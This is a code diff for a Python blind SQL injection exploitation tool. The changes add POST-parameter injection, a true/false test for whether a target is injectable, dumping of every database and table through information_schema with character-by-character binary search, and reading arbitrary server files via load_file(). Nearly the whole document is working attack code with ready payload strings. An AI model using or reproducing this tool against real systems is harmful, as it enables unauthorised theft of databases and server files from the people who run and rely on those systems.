@@ -7,25 +7,31 @@ from terminaltables import AsciiTable
 def main():
 
 	global url
-	global payload
 	global cookies
 	global session
+	global post_data
+	
+	# Arrancamos una sesion de requests ya que asi agilizamos el tema de los handshakes
 	session = requests.session()
 	cookies = None
-
 	argv = parse_arguments()
+	post_data = argv['data']
 	
 	if argv['cookies'] is not None:
 		cookies = parse_cookies(argv)
 
 	url = ''.join(argv['u'])
-	payload = '&Submit=Submit'
 	
 	print("---> Testing target...")
 	r = session.get(url, cookies=cookies)
 	
 	if r is not None:
-		print("--> Target is awake\n")
+		print("--> Target is awake")
+		if not is_injectable():
+			print("---> Target does not seem to be injectable\n")
+			return
+		else:
+			print("---> Target seems to be injectable\n")
 
 	if argv['activedb']:
 		print(f"\n--> Active db: {''.join(find_active_db())}")
@@ -43,9 +49,31 @@ def main():
 
 	if argv['t'] and argv['db']:
 		print(f"Dumping table {argv['db']}.{argv['t']}...")
-
 		dump_table(argv['db'], argv['t'])
 
+	if argv['all_db']:
+		dump_all_db()
+
+	if argv['lfi']:
+		dump_file(argv['lfi'])
+
+
+def send_request(query):
+
+	# Si tenemos el flag de --data, se envia por POST, y si no por GET
+	global post_data
+
+	if post_data:
+		data_params = post_data.split("&")
+		post_data = {}
+		
+		for param in data_params:
+			key, value = param.split("=")
+			post_data[key] = query if "*" in value else value
+		
+		return session.post(url, data=post_data, cookies=cookies, headers={"Content-Type": "application/x-www-form-urlencoded"})
+	else:
+		return session.get(url.replace("*", query), cookies=cookies)
 
 def parse_cookies(argv):
 	cookies = {}
@@ -78,6 +106,12 @@ def parse_arguments():
 	return vars(parser.parse_args())
 
 
+def is_injectable() -> bool:
+	r1 = send_request("1' AND '1'='1' -- -")
+	r2 = send_request("1' AND '1'='0' -- -")
+	return r1.text != r2.text
+
+
 def find_active_db() -> str:
 
 	print("--> Finding length of active DB name...")
@@ -104,6 +138,19 @@ def find_n_db() -> int:
 	return find_query_count("select count(schema_name) from information_schema.schemata")
 
 
+def dump_all_db():
+
+	n_db = find_n_db()
+	print(f"--> There are {n_db} databases to dump")
+	concat_len = find_query_length(f"select length(group_concat(schema_name)) from information_schema.schemata")
+	dbs = find_query_string(f"select ascii(substring(group_concat(schema_name),*,1)) from information_schema.schemata", concat_len)
+	dbs = dbs.split(",")
+	del dbs[0]
+
+	for db in dbs:
+		print(f"--------------- DUMPING {db} ---------------")
+		dump_db(db)
+
 def dump_db(db_name) -> None:
 	
 	concat_len = find_query_length(f"select length(group_concat(table_name)) from information_schema.tables where table_schema='{db_name}'")
@@ -115,6 +162,7 @@ def dump_db(db_name) -> None:
 		dump_table(db_name, table) 
 
 def dump_table(db_name, table_name) -> None:
+
 	concat_len = find_query_length(f"select length(group_concat(column_name)) from information_schema.columns where table_name='{table_name}'")
 	
 	tbl_schema = find_query_string(f"select ascii(substring(group_concat(column_name),*,1)) from information_schema.columns where table_name='{table_name}'", concat_len)
@@ -132,33 +180,44 @@ def dump_columns(columns, db_name, table_name) -> list:
 		print("--> Dumping record...")
 		query_len = find_query_length(f"select length(concat({columns})) from {db_name}.{table_name} limit {i},1")
 		
-		# Recibimos y parseamos
 		record = find_query_string(f"select ascii(substring(concat({columns}),*,1)) from {db_name}.{table_name} limit {i},1", query_len)
 		tbl_schema.append(record.split(":"))
 	return tbl_schema
 
+
+def dump_file(filename):
+
+	print(f"---> Attempting to dump {filename} (this may take some time)")
+	concat_len = find_query_length(f"select length(load_file('{filename}'))")
+	print(f"File size: {concat_len} characters")
+	filedump = find_query_string(f"select ascii(substring(load_file('{filename}'),*,1))", concat_len, dump_file=True)
+
+	print("-------------------\n")
+	print(filedump)
+
+
 def find_query_count(query):
+	# En o(n) por simplicidad ya que al ser numeros pequeños no afecta mucho la eficiencia
 	i = 0
-	r_base = session.get(url + payload, cookies=cookies)
+	r_base = send_request("")
 	r = r_base
 
 	while r_base.text == r.text:
 		i += 1
-		r = session.get(f"{url}1' and ({query})={i} -- -&Submit=Submit#", cookies=cookies)
-		size = len(r.text)
+		r = send_request(f"1' and ({query})={i} -- -")
 		
 	return i
 
 def find_query_length(query):
 	res_text = []
 
-	r_base = session.get(url + payload, cookies=cookies)
+	r_base = send_request("")
 	r = r_base
 
 	# Sacar longitud de la query con busqueda binary (o(logn))
-	low, high= 1, 150
+	low, high= 1, 10000
 	while high - low > 1:
-		r = session.get(f"{url}1' and ({query})<{ (low + high) // 2 } -- -&Submit=Submit#", cookies=cookies)
+		r = send_request(f"1' and ({query})<{ (low + high) // 2 } -- -")
 
 		if r.text != r_base.text:
 			high = (low + high) // 2
@@ -167,22 +226,21 @@ def find_query_length(query):
 
 	return low
 
-def find_query_string(query, query_len):
-	low, high = 32, 126
+def find_query_string(query, query_len, dump_file=False):
+	low, high = (31 if not dump_file else 0), 126 # si dumpeas un archivo tambien puede haber \n
 	i = 1
 	query_res = []
 
-	r_base = requests.get(url + payload, cookies=cookies)
+	r_base = send_request("")
 	r = r_base
 	
 	while len(query_res) < query_len:
-		low, high = 32, 126
+		low, high = (31 if not dump_file else 0), 126
 		
 		while high - low > 1:
 			mid = (low + high) // 2
-			#print(mid)
-			#print(f"{url}1' and ({query.replace("*", str(i))})<={mid} -- -&Submit=Submit#")
-			r = session.get(f"{url}1' and ({query.replace("*", str(i))})<={mid} -- -&Submit=Submit#", cookies=cookies)
+
+			r = send_request(f"1' and ({query.replace("*", str(i))})<={mid} -- -")
 
 			if r.text != r_base.text:
 				high = mid
@@ -191,7 +249,8 @@ def find_query_string(query, query_len):
 
 		query_res.append(chr(low + 1))
 		i += 1
-		print(f"\r{''.join(query_res).lower()}", end='')
+		if not dump_file:
+			print(f"\r{''.join(query_res).lower()}", end='')
 	print("\n")
 
 	return ''.join(query_res).lower()
@@ -203,7 +262,7 @@ def print_banner():
   / /  ___ ___ _/ (_) ___  __ __
  / _ \(_-</ _ `/ / / / _ \/ // /
 /_.__/___/\_, /_/_(_) .__/\_, / 
-           /_/     /_/   /___/  
+		   /_/     /_/   /___/  
 """
 	print(text)
 	print(" A blind SQL injection exploitation tool")
